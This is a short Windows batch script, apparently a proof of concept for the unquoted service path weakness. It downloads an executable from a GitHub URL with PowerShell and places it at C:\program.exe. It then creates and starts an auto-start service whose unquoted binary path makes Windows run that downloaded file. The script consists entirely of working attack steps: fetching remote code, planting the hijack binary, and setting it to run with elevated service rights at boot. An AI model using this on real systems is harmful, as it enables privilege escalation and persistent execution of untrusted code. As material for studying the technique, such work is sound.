@echo off

echo Starting Execution

copy C:\Windows\System32\calc.exe "C:\Program Files\program.exe"
powershell -Command "Invoke-WebRequest https://github.com/void010/dummy/raw/main/cpp_poc_64.exe -OutFile C:\users\alfred.v\Downloads\cpp_poc_64.exe"
copy C:\users\alfred.v\Downloads\cpp_poc_64.exe "C:\program.exe"
sc create "Example Service" binpath= "C:\Program Files\program.exe" Displayname= "Example Service" start= auto
sc start "Example Service"

pause
